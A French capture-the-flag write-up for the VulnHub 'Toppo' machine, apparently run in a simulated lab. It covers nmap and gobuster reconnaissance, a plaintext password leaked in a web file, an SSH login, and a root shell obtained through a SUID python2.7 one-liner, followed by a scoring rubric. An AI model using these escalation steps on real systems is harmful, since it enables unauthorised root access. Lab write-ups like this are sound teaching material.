# Write-up — Toppo (VulnHub)

**Cible :** 192.168.56.102 (Toppo) · **Attaquant :** 192.168.56.101 (Kali) · **Réseau :** Host-Only VirtualBox, isolé
**Résultat :** shell root, flag final
**Moteur du labo :** Pentest Lab v2 — bac à sable libre (`sim-engine.js`), aucune étape imposée

---

## 1. Reconnaissance

```
nmap -sV -sC 192.168.56.102
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
```

Deux ports utiles : **22** (SSH) et **80** (HTTP). Le port 111 (rpcbind) est un
service système standard, sans intérêt ici.

## 2. Énumération web

```
gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
admin/              (Status: 301)  --> http://192.168.56.102/admin/
mail/               (Status: 301)  --> http://192.168.56.102/mail/
img/ css/ js/ vendor/ manual/      (Status: 301)  -- template, sans intérêt
LICENSE             (Status: 200)
server-status       (Status: 403)
```

Deux répertoires à explorer : `/admin/` et `/mail/`.

## 3. Fuite d'information

```
curl http://192.168.56.102/admin/
```
→ liste `notes.txt`.

```
curl http://192.168.56.102/admin/notes.txt
```

```
Note to myself :
I need to change my password :/
12345ted123 is too outdated but the technology isn't my thing
i prefer go fishing or watching soccer .
```

Mot de passe en clair : `12345ted123`. Le texte parle de pêche — une fois
connecté, le dossier personnel confirme l'utilisateur : **ted**.

*(Bonus optionnel : `/mail/thoughts.txt` confirme la même mauvaise habitude
de mot de passe réutilisé.)*

## 4. Accès initial — SSH

```
ssh ted@192.168.56.102
```

- confirmation d'empreinte : `yes`
- mot de passe : `12345ted123`

```
ted@Toppo:~$
```

## 5. Énumération locale

```
sudo -l
```
```
-bash: sudo: command not found
```
sudo n'est même pas installé : la voie classique est fermée.

```
find / -perm -4000 -type f 2>/dev/null
```

```
/sbin/mount.nfs
/usr/bin/python2.7
```

`/usr/bin/python2.7` SUID root est l'anomalie : aucune Debian standard ne
rend son interpréteur Python SUID. C'est la porte d'entrée.

*(Avant cette étape, `cat /root/flag.txt` renvoie `Permission non accordée`
— ted n'a ni les droits `owner` ni les droits `other` sur ce fichier. Ce
refus est une vraie vérification de permissions du bac à sable, pas un
message figé : il disparaît automatiquement une fois root obtenu.)*

## 6. Élévation de privilèges

Un interpréteur SUID root peut forcer son propre UID effectif via le module
`os`, puis lancer un shell qui hérite de ce root :

```
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
whoami
root
```

## 7. Flag

```
root@Toppo:~# cat /root/flag.txt
```

```
Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

---

## Ce qu'il faut retenir

- **On énumère avant d'exploiter.** Chaque étape produit l'information qui
  débloque la suivante : nmap → gobuster → notes.txt → SSH → find → SUID → root.
- **Les permissions Unix ne sont pas décoratives.** Le refus d'accès à
  `/root` avant privesc est réel dans ce labo — c'est exactement ce refus
  qui justifie tout le chapitre élévation de privilèges.
- **Un mot de passe dans un fichier web exposé est une fuite classique.**
  Toujours visiter les répertoires trouvés par un brute-force, pas
  seulement lister leur existence.
- **Un binaire interpréteur SUID (python, perl, vim, less…) est presque
  toujours exploitable** : il suffit de lui faire exécuter un appel
  système avec les privilèges hérités du SUID.

---

## Barème (v2 — objectifs pondérés)

| Objectif | Catégorie | Points |
|---|---|---|
| Scanner la cible (nmap) | Reconnaissance | 10 |
| Découvrir les répertoires cachés (gobuster) | Reconnaissance | 10 |
| Récupérer les identifiants exposés | Fuite d'information | 15 |
| Ouvrir une session SSH | Accès initial | 20 |
| Repérer le binaire SUID anormal | Élévation de privilèges | 15 |
| Obtenir un shell root | Élévation de privilèges | 20 |
| Valider le flag | Validation | 10 |
| **Total** | | **100 → /20** |

**Bonus (jusqu'à +5, non indispensables) :**
- Lire l'historique bash de ted (+2)
- Explorer `/mail/` (+2)
- Se heurter à un `Permission denied` avant l'élévation (+1) — c'est la
  preuve que tu as tenté le raccourci et compris pourquoi il échoue.

**Pénalités**, appliquées objectif par objectif (jamais globalement) :
- un indice consulté coûte 15 % des points de *cet* objectif (plafonné à
  2 indices comptés, soit -30 % max) ;
- une solution révélée plafonne cet objectif à 40 % de ses points, quel
  que soit le nombre d'indices déjà pris ;
- un objectif réellement validé garde toujours un minimum de 15 % de ses
  points, même si tu as tout dévoilé — la validation elle-même a une valeur.

Une fois le flag validé, la note ne peut plus descendre sous **4/20** —
terminer la chaîne complète a toujours une valeur, même très aidé.

**Score sans aucun indice ni solution, avec le bonus « permission
refusée » : 20/20** (7/7 objectifs, 1/3 bonus) — c'est le déroulé
ci-dessus, rejoué et vérifié dans le simulateur.
